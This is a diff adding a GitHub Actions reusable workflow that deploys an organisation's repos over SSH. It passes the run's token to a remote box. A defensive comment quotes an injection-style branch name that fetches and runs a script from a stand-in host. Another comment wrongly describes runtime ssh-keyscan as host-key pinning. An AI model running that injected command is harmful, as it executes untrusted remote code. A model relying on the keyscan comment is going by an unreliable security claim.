@@ -1,0 +1,102 @@
+name: CipherPlay Deploy
+
+# Org-level reusable deploy. Any CipherPlayLabs repo can call this; the box does
+# the rest based on the manifest the repo carries at .cipherplay/deploy.env.
+#
+# Caller (.github/workflows/deploy.yml in your repo):
+#
+#   name: Deploy
+#   on:
+#     push: { branches: [main] }     # omit for manual-only
+#     workflow_dispatch:
+#   jobs:
+#     deploy:
+#       uses: CipherPlayLabs/.github/.github/workflows/deploy.yml@main
+#       secrets: inherit
+#
+# Requires two ORG secrets (Settings -> Secrets -> Actions, org level):
+#   DEPLOY_SSH_HOST  deploy@176.9.219.106
+#   DEPLOY_SSH_KEY   the private half of the box's cipherplay-org-deploy key
+#
+# No GitHub credentials are stored on the box. We hand it this run's ephemeral
+# GITHUB_TOKEN over stdin; it is scoped to this repo alone and expires with the
+# job. The box uses it to clone, then scrubs it from .git/config.
+
+on:
+  workflow_call:
+    inputs:
+      ref:
+        description: 'Git ref to deploy. Defaults to the branch that triggered the run.'
+        type: string
+        required: false
+        default: ''
+      repo:
+        description: 'Repo name on the box. Defaults to this repo. Must match /srv/<name>.'
+        type: string
+        required: false
+        default: ''
+    secrets:
+      DEPLOY_SSH_HOST:
+        required: true
+      DEPLOY_SSH_KEY:
+        required: true
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+
+    # Only needs to read this repo, to mint the token the box clones with.
+    permissions:
+      contents: read
+
+    # One deploy per repo at a time. A second push queues rather than racing two
+    # builds into the same webroot.
+    concurrency:
+      group: cpdeploy-${{ inputs.repo || github.event.repository.name }}
+      cancel-in-progress: false
+
+    steps:
+      - name: Install deploy key
+        env:
+          KEY: ${{ secrets.DEPLOY_SSH_KEY }}
+          HOST: ${{ secrets.DEPLOY_SSH_HOST }}
+        run: |
+          set -euo pipefail
+          mkdir -p ~/.ssh && chmod 700 ~/.ssh
+          printf '%s\n' "$KEY" > ~/.ssh/cpdeploy
+          chmod 600 ~/.ssh/cpdeploy
+          # Pin the host key rather than blindly accepting it, so a hijacked DNS
+          # entry can't collect our deploy token.
+          ssh-keyscan -t ed25519 "${HOST##*@}" >> ~/.ssh/known_hosts 2>/dev/null
+
+      - name: Deploy
+        env:
+          # Passed as env, NOT interpolated into the shell line: a branch named
+          # `$(curl evil.sh|sh)` would otherwise execute on the runner.
+          HOST: ${{ secrets.DEPLOY_SSH_HOST }}
+          REPO: ${{ inputs.repo || github.event.repository.name }}
+          REF: ${{ inputs.ref || github.ref_name }}
+          TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          echo "Deploying $REPO@$REF via $HOST"
+          # Token goes over stdin, never argv — argv is world-readable in /proc.
+          printf '%s\n' "$TOKEN" \
+            | ssh -i ~/.ssh/cpdeploy -o BatchMode=yes -o ConnectTimeout=20 \
+                  "$HOST" "cpdeploy $REPO $REF" \
+            | tee deploy.log
+
+      - name: Summary
+        if: always()
+        run: |
+          {
+            echo "## Deploy"
+            echo
+            if [ -s deploy.log ]; then
+              echo '```'
+              tail -20 deploy.log
+              echo '```'
+            else
+              echo '_No output — the deploy did not run._'
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
